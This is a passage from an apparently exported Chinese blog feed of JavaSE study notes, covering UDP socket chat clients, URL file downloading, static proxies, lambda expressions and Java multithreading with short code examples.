dg.receive(datagramPacket);</span><br><span class="line">                String s = <span class="keyword">new</span> String(datagramPacket.getData());</span><br><span class="line">                System.out.println(datagramPacket.getPort()+<span class="string">&quot;----&gt;&quot;</span>+s);</span><br><span class="line">                <span class="keyword">if</span> (s.trim().equals(<span class="string">&quot;bye&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dg.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SocketException </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadSend(<span class="keyword">new</span> DatagramSocket(), <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in)) , <span class="number">7789</span>, <span class="string">&quot;localhost&quot;</span>)).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> SendReceive(<span class="keyword">new</span> DatagramSocket(<span class="number">8899</span>))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SocketException </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadSend(<span class="keyword">new</span> DatagramSocket(), <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in)) , <span class="number">8899</span>, <span class="string">&quot;localhost&quot;</span>)).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> SendReceive(<span class="keyword">new</span> DatagramSocket(<span class="number">7789</span>))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p>用于下载网络资源</p><ol><li>先给定资源的url</li><li>打开创建连接 openconnecion</li><li>获取资源的流 getInputStream()</li><li>创建输出流存储对象 FileOutpuStream</li></ol><p>下载网易云音乐的案例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebDown</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;https://m704.music.126.net/20220131225410/07833633931fbd23b4a47e0348e817d9/jdyyaac/obj/w5rDlsOJwrLDjj7CmsOj/11716071744/b75d/88b1/6d70/d2db9d45ac70f980447edef5d5d7983e.m4a?authSecret=0000017eb08a2550083f0aaba092204a&quot;</span>);</span><br><span class="line">        URLConnection urlConnection = url.openConnection();</span><br><span class="line"></span><br><span class="line">        InputStream inputStream = urlConnection.getInputStream();</span><br><span class="line"></span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;xx.m4a&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ( (len=inputStream.read(buffer)) != -<span class="number">1</span> )&#123;</span><br><span class="line">            fileOutputStream.write(buffer, <span class="number">0</span> ,len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaSE </tag>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态代理</title>
      <link href="/2022/01/29/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>/2022/01/29/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<center><h1>    静态代理    </h1></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>所谓静态也就是在程序运行前就已经存在代理类的字节码文件，代理类和委托类的关系在运行前就确定了</p><p>  举例理解：以租房为例，房东只需要处理自己的房子交给中介即可，其余的都是由中介充当代理进行租客签协议，带租客看房子，等等。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>静态代理需要满足三点</p><p>  1、需要有真实角色<br>  2、需要有一个代理角色<br>  3、这两个角色之间必须实现相同的接口</p><h2 id="静态代理类优缺点"><a href="#静态代理类优缺点" class="headerlink" title="静态代理类优缺点"></a>静态代理类优缺点</h2><p>优点：真实角色也就是业务类只需要关注业务逻辑本身，保证了业务类的重用性。这是代理的共有优点。</p><p>缺点：<br>1、代理对象的一个接口只服务于一种类型的对象，如果要代理的方法很多，势必要为每一种方法都进行代理，静态代理在程序规模稍大时就无法胜任了。<br>2、如果接口增加一个方法，除了所有实现类需要实现这个方法外，所有代理类也需要实现此方法。增加了代码维护的复杂度。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ProxyMe proxyMe = <span class="keyword">new</span> ProxyMe(<span class="keyword">new</span> Me());</span><br><span class="line">        proxyMe.happyProgram();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Program</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">happyProgram</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//目标对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> <span class="keyword">implements</span> <span class="title">Program</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">happyProgram</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我在学java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代理对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyMe</span> <span class="keyword">implements</span> <span class="title">Program</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Me target;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ProxyMe</span><span class="params">(Me target)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">happyProgram</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        after();</span><br><span class="line">        <span class="keyword">this</span>.target.happyProgram();</span><br><span class="line">        before();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;打开电脑&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;关闭电脑&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaSE </tag>
            
            <tag> 静态代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lamda表达式</title>
      <link href="/2022/01/29/Lamda%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2022/01/29/Lamda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<center><h1>Lamda表达式</h1></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>希腊字母表排序第十一位字母，英语名称位Lamda</li><li>避免匿名内部类定义过多</li><li>其实属于函数式编程概念</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201291319458.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a-&gt;System.out.println(<span class="string">&quot;i like lamda--&gt;&quot;</span>a);</span><br></pre></td></tr></table></figure><h2 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h2><ul><li>避免匿名内部类定义过多</li><li>可以让代码看起来更加的简洁</li><li>去掉了一推没有意义的代码只留下核心的逻辑</li></ul><h2 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a>使用前提</h2><p>理解函数式接口是学习lamda表达式的关键所在</p><p>函数接口的定义：</p><ul><li><p>任何接口如果只包含唯一一个抽象方法，那么它就是一个函数式接口。如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对于函数式接口，我们可以通过Lamda表达式来创建该接口的对象。</p></li></ul><h1 id="演化过程"><a href="#演化过程" class="headerlink" title="演化过程"></a>演化过程</h1><p>Lambda格式<code>()-&gt;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LambdaTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//静态内部类</span></span><br><span class="line">   <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLambdaImpl2</span> <span class="keyword">implements</span> <span class="title">MyLambda</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是我的方法&quot;</span>+age);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//局部内部类</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">MyLambdaImpl3</span> <span class="keyword">implements</span> <span class="title">MyLambda</span></span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;这是我的方法&quot;</span>+age);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        MyLambdaImpl myLambda = <span class="keyword">new</span> MyLambdaImpl();</span><br><span class="line">        myLambda.run(<span class="number">89</span>);</span><br><span class="line"></span><br><span class="line">        MyLambdaImpl2 myLambda1 = <span class="keyword">new</span> MyLambdaImpl2();</span><br><span class="line">        myLambda1.run(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        MyLambdaImpl3 myLambdaImpl3 = <span class="keyword">new</span> MyLambdaImpl3();</span><br><span class="line">        myLambdaImpl3.run(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Lambda表达式</span></span><br><span class="line">        MyLambda myLambda2 = (<span class="keyword">int</span> age)-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是我的方法&quot;</span>+age);</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">                <span class="comment">// 简化1 去返回类型</span></span><br><span class="line">        MyLambda myLambda3 = (age)-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是我的方法&quot;</span>+age);</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 简化2 去括号</span></span><br><span class="line">        MyLambda myLambda4 = age-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是我的方法&quot;</span>+age);</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">         <span class="comment">// 简化3 去花括号</span></span><br><span class="line">        MyLambda myLambda5 = age-&gt; System.out.println(<span class="string">&quot;这是我的方法&quot;</span>+age);</span><br><span class="line"></span><br><span class="line">        myLambda4.run(<span class="number">1000</span>);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">MyLambda</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">int</span> age)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLambdaImpl</span> <span class="keyword">implements</span> <span class="title">MyLambda</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是我的方法&quot;</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>lambda只能有一行代码的情况下才能简化为一行，如果有多行就得用代码块包起来</li><li>前提接口为函数式接口。</li><li>多个参数也可以去掉类型，要去掉就得都去掉<code>必须加上括号</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程</title>
      <link href="/2022/01/29/%E5%A4%9A%E7%BA%BF%E7%A8%8BThread/"/>
      <url>/2022/01/29/%E5%A4%9A%E7%BA%BF%E7%A8%8BThread/</url>
      
        <content type="html"><![CDATA[<center><h1>多线程</h1></center><h1 id="线程简介"><a href="#线程简介" class="headerlink" title="线程简介"></a>线程简介</h1><h3 id="多任务"><a href="#多任务" class="headerlink" title="多任务"></a>多任务</h3><p>一个人做多个事情叫多任务，其实本质上我们大脑在同一时间段依旧只做了一件事情。</p><p>生活中的多任务</p><ul><li><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201291036844.png"></li></ul><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>原来一条路，慢慢的因为车太多了单路堵塞效率低，为了提高使用效率，能够充分利用道路于是加多个车道</p><ul><li><p>单车道和多车道</p></li><li><center><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201291040734.png" alt="" width = "40%"><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201291042037.png" alt="" width = "40%"> </center></li></ul><h2 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h2><center><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201291047686.png" alt="" width = "40%"><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201291047116.png" alt="" width = "40%"> </center><p>在操作系统中运行的程序就是进程例如QQ，播放器，游戏，IDE</p><p>线程就是独立的执行路径<br>在程序运行时，即使没有自己创建线程，后台也会有多个线程，如主线程，gc线程<br>main() 称之为主线程，为系统的入口，用于执行整个程序<br>在一个进程中，如果开辟了多个线程，线程的运行由调度器安排调度，调度器是与操作系统紧密相关的，先后顺序是不能认为的干预的。<br>对同一份资源操作时，会存在资源抢夺的问题，需要加入并发控制<br>线程会带来额外的开销，如cpu调度时间，并发控制开销<br>每个线程在自己的工作内存交互，内存控制不当会造成数据不一致</p><h1 id="线程实现"><a href="#线程实现" class="headerlink" title="线程实现"></a>线程实现</h1><p>Thread、Runnable、Callable</p><p>三种实现创建方式</p><center><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201291106186.png" alt="" width = "auto"></center><h2 id="Thread方式"><a href="#Thread方式" class="headerlink" title="Thread方式"></a>Thread方式</h2><ol><li>自定义线程继承Thread类</li><li>重写run方法，编写线程执行体</li><li>创建线程对象，调用start方法启动线程</li></ol><ul><li>线程不一定立即执行需要听从CPU的调度安排</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadTest</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是多线程&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> ThreadTest().start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是主线程&quot;</span>+i);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>子类继承Tread类具备多线程能力</li><li>启动线程：子类对象.start();</li><li><code>不建议使用避免oop单继承局限性</code></li></ul><h2 id="Runnable方式"><a href="#Runnable方式" class="headerlink" title="Runnable方式"></a>Runnable方式</h2><p>创建线程使用方式:</p><ol><li>实现runnable接口</li><li>重写run方法</li><li>执行线程需要丢入runnable接口实现类，掉用start方法。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RunnableTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是多线程&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RunableTest runableTest = <span class="keyword">new</span> RunableTest();</span><br><span class="line">        <span class="keyword">new</span> Thread(runableTest).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是主线程&quot;</span>+i);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>实现接口Runnable具有多线程能力</li><li>启动线程：传入目标对象+Thread对象.start();</li><li><code>推荐使用：避免单继承局限性、灵活方便，方便同一个对象被多个线程使用</code></li></ul><h2 id="Callable方式"><a href="#Callable方式" class="headerlink" title="Callable方式"></a>Callable方式</h2><ol><li>实现Callable接口</li><li>重写call方法</li><li>创建执行服务</li><li>获取结果</li><li>关闭服务</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallableTest</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">Boolean</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    String url, name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> WebDownloads().downloads(url, name);</span><br><span class="line">        System.out.println(<span class="string">&quot;下载图片&quot;</span>+name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CallableTest</span><span class="params">(String url, String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        CallableTest call1 = <span class="keyword">new</span> CallableTest(<span class="string">&quot;https://i2.hdslb.com/bfs/archive/6693f3c783ff1c5a29d83a5d23d397b5f5116dd0.jpg@672w_378h_1c.webp&quot;</span>, <span class="string">&quot;1.png&quot;</span>);</span><br><span class="line">        CallableTest call2 = <span class="keyword">new</span> CallableTest(<span class="string">&quot;https://i0.hdslb.com/bfs/archive/a197cb4c3dad32de4a74ac04547a0bc516ccbff7.jpg@672w_378h_1c.webp&quot;</span>, <span class="string">&quot;2.png&quot;</span>);</span><br><span class="line">        CallableTest call3 = <span class="keyword">new</span> CallableTest(<span class="string">&quot;https://i0.hdslb.com/bfs/archive/8828683db0c7326036e8caa07d953078da9f497e.jpg@672w_378h_1c.webp&quot;</span>, <span class="string">&quot;3.png&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建执行服务</span></span><br><span class="line">        ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//提交执行</span></span><br><span class="line">        Future&lt;Boolean&gt; submit = 